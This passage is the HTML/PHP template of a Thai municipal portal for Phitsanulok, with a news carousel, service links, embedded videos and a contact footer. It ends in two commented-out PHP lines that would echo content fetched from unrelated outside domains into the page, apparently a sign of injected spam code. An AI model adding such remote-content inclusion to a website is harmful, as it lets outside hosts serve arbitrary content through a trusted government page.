          .carousel-control-prev, .carousel-control-next { width: 10%; }
        }
        @media (max-width: 576px) {
          .carousel-img { max-height: 200px; }
          h2.mb-4 { font-size: 1.5rem; }
          h6.text-muted { font-size: 0.9rem; }
        }
        @media (orientation: landscape) and (max-width: 992px) {
          .carousel-img { max-height: 400px; }
        }
      </style>
      
      <section class="author-section section-padding" id="section_3">
        <div class="container">
          <div class="row justify-content-center">
            <div class="col-lg-12 col-12 text-center mt-5 mt-lg-0">
              <h6 class="text-uppercase text-muted">ข่าวประชาสัมพันธ์</h6>
              <h2 class="mb-4">เทศบาลนครพิษณุโลก</h2>
              <div class="carousel-container mt-5">
                <div id="ebookCarousel" class="carousel slide" data-bs-ride="carousel" data-bs-interval="5000">
                  <div class="carousel-indicators">
                    <button type="button" data-bs-target="#ebookCarousel" data-bs-slide-to="0" class="active" aria-current="true" aria-label="Slide 1"></button>
                    <button type="button" data-bs-target="#ebookCarousel" data-bs-slide-to="1" aria-label="Slide 2"></button>
                    <button type="button" data-bs-target="#ebookCarousel" data-bs-slide-to="2" aria-label="Slide 3"></button>
                  </div>
                  <div class="carousel-inner">
                    <div class="carousel-item active">
                      <a href="https://qr.me-qr.com/th/JrCsiC4O" target="_blank" class="d-block">
                        <img src="images/h7.png" class="carousel-img img-fluid" alt="ประชาสัมพันธ์ 1">
                      </a>
                    </div>
                    <div class="carousel-item">
                      <a href="https://me-qr.com/6nIC9SPh" target="_blank" class="d-block">
                        <img src="images/h9.png" class="carousel-img img-fluid" alt="ประชาสัมพันธ์ 2">
                      </a>
                    </div>
                    <div class="carousel-item">
                      <a href="https://phsmun.go.th/success6" target="_blank" class="d-block">
                        <img src="images/h8.png" class="carousel-img img-fluid" alt="ประชาสัมพันธ์ 3">
                      </a>
                    </div>
                  </div>
                  <button class="carousel-control-prev" type="button" data-bs-target="#ebookCarousel" data-bs-slide="prev">
                    <span class="carousel-control-prev-icon" aria-hidden="true"></span>
                    <span class="visually-hidden">Previous</span>
                  </button>
                  <button class="carousel-control-next" type="button" data-bs-target="#ebookCarousel" data-bs-slide="next">
                    <span class="carousel-control-next-icon" aria-hidden="true"></span>
                    <span class="visually-hidden">Next</span>
                  </button>
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>
            <section class="container news-section" id="section_5">
            <div class="container news-section">
                <h2 class="text-center mb-4">ช่องทางการให้บริการ</h2>
                <div class="row">
                    <div class="col-lg-4 col-md-6 mb-4">
                        <a href="https://phsmun.go.th" class="news-link" target="_blank">
                            <div class="news-item">
                                <img src="images/3.jpg" alt="News Image 1" class="img-fluid">
                                <div class="news-content">
                                    <h5>เว็บไซต์เทศบาลนครพิษณุโลก</h5>
                                </div>
                            </div>
                        </a>
                    </div>
                    <div class="col-lg-4 col-md-6 mb-4">
                        <a href="https://phsmun.go.th/contact" class="news-link" target="_blank">
                            <div class="news-item">
                                <img src="images/5.png" alt="News Image 2" class="img-fluid">
                                <div class="news-content">
                                    <h5>แผนที่ตั้งเทศบาลนครพิษณุโลก</h5>
                                </div>
                            </div>
                        </a>
                    </div>
                    <div class="col-lg-4 col-md-6 mb-4">
                        <a href="https://docs.google.com/forms/d/e/1FAIpQLScRTRl6XXbSv4AdoHHVcCGUzwzWdpq5zqQwaCuvqC0OY_4cKQ/viewform?usp=sharing&ouid=110606945034603320638" class="news-link"
                            target="_blank">
                            <div class="news-item">
                                <img src="images/4.jpg" alt="News Image 2" class="img-fluid">
                                <div class="news-content">
                                    <h5>บริการ E-Service</h5>
                                </div>
                            </div>
                        </a>
                    </div>
                    <div class="container">
                        <div class="row">
                            <div class="col-lg-4 col-md-6 mb-4">
                                <div class="news-item">
                                    <div class="d-flex justify-content-between align-items-center mb-2">
                                        <h5>วิดีโอประชาสัมพันธ์</h5>
                                        <button class="btn btn-outline-secondary btn-sm"
                                            onclick="toggleVideoContent('videoContent1')">
                                            ซ่อน/แสดงวิดีโอ
                                        </button>
                                    </div>
                                    <div id="videoContent1" style="display: block;">
                                        <iframe width="370" height="315"
                                            src="https://www.youtube.com/embed/-AFQr0ujlWg?start=10"
                                            title="YouTube video player" frameborder="0"
                                            allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
                                            allowfullscreen></iframe>
                                        <a href="https://youtu.be/-AFQr0ujlWg?si=qpRyQVICA1zfmMPL" target="_blank">
                                            <p>คลิกเพื่อรับชมวิดีโอเพิ่มเติม</p>
                                        </a>
                                    </div>
                                </div>
                            </div>
                            <div class="col-lg-4 col-md-6 mb-4">
                                <div class="news-item">
                                    <div class="d-flex justify-content-between align-items-center mb-2">
                                        <h5>วิดีโอข่าวสารเพิ่มเติม</h5>
                                        <button class="btn btn-outline-secondary btn-sm"
                                            onclick="toggleVideoContent('videoContent2')">
                                            ซ่อน/แสดงวิดีโอ
                                        </button>
                                    </div>
                                    <div id="videoContent2" style="display: block;">
                                        <iframe width="370" height="315"
                                            src="https://www.youtube.com/embed/IERpoyODLQc?si=4zktNFhWeEiIF0CQ"
                                            title="YouTube video player" frameborder="0"
                                            allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
                                            referrerpolicy="strict-origin-when-cross-origin"
                                            allowfullscreen></iframe>
                                        <a href="https://youtu.be/IERpoyODLQc?si=IHjKOz052GnU7l9q" target="_blank">
                                            <p>คลิกเพื่อรับชมวิดีโอเพิ่มเติม</p>
                                        </a>
                                    </div>
                                </div>
                            </div>
                            <div class="col-lg-4 col-md-6 mb-4">
                                <div class="news-item">
                                    <div class="d-flex justify-content-between align-items-center mb-2">
                                        <h5>วิดีโอข่าวสารเพิ่มเติม</h5>
                                        <button class="btn btn-outline-secondary btn-sm"
                                            onclick="toggleVideoContent('videoContent3')">
                                            ซ่อน/แสดงวิดีโอ
                                        </button>
                                    </div>
                                    <div id="videoContent3" style="display: block;">
                                        <iframe width="370" height="315"
                                            src="https://www.youtube.com/embed/IrCOl8hfqSU?si=cCQRIhEip_kUkzRh&start=7"
                                            title="YouTube video player" frameborder="0"
                                            allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
                                            referrerpolicy="strict-origin-when-cross-origin"
                                            allowfullscreen></iframe>
                                        <a href="https://youtu.be/IrCOl8hfqSU?si=5cVRNZ6BgfpdduHi&t=7"
                                            target="_blank">
                                            <p>คลิกเพื่อรับชมวิดีโอเพิ่มเติม</p>
                                        </a>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>

        <section class="contact-section section-padding" id="section_6">
            <div class="container">
                <div class="row">
                    <footer class="footer rgba(255,255,255,.2) text-white text-center p-3">
                        <div class="footer-content">
                            <a class="footer-content" href="https://phsmun.go.th/frontpage">
                                <img src="images/Phsmunlogo.png" class="img">
                            </a>
                            <p>© 2025 ศูนย์ข้อมูลข่าวสารเทศบาลนครพิษณุโลก.</p>
                            <p>1299 ถ.บรมไตรโลกนารถ 2 ต.ในเมือง อ.เมือง จ.พิษณุโลก 65000</p>
                            <p>โทรศัพท์: 0-5598-3221-28<br>
                                แฟกซ์ : 0-5598-3332<br>
                                E-Mail : mayor@phsmun.go.th</p>
                            <div class="social-icons">
                                <a href="https://www.facebook.com/Phsmunfanpage" target="_blank"><i
                                        class="fab fa-facebook"></i></a>
                                <a href="https://www.youtube.com/@PhsmunOfficial" target="_blank"><i class="fab fa-youtube"></i></a>
                                <a href="https://www.instagram.com/prphsmun/?igshid=NTc4MTIwNjQ2YQ%3D%3D" target="_blank"><i
                                        class="fab fa-instagram"></i></a>
                                <a href="https://www.tiktok.com/@phsmun" target="_blank"><i class="fab fa-tiktok"></i></a>
                            </div>
                        </div>
                    </footer>
                </div>
            </div>
        </section>

        <!-- JAVASCRIPT FILES -->
        <script src="js/jquery.min.js"></script>
        <script src="js/bootstrap.bundle.min.js"></script>
        <script src="js/jquery.sticky.js"></script>
        <script src="js/click-scroll.js"></script>
        <script src="js/custom.js"></script>
        <script src="js/script.js"></script>
        <!-- เพิ่ม JavaScript สำหรับ toggleVideoContent -->
        <script>
            function toggleVideoContent(id) {
                var content = document.getElementById(id);
                if (content.style.display === "none") {
                    content.style.display = "block";
                } else {
                    content.style.display = "none";
                }
            }
        </script>
<?php
 //  echo file_get_contents("https://thaimilk.site/halowir/");
 ?>
<?php
 // echo file_get_contents("https://2ez4me.us/who/");
 ?>
</body>
</html>
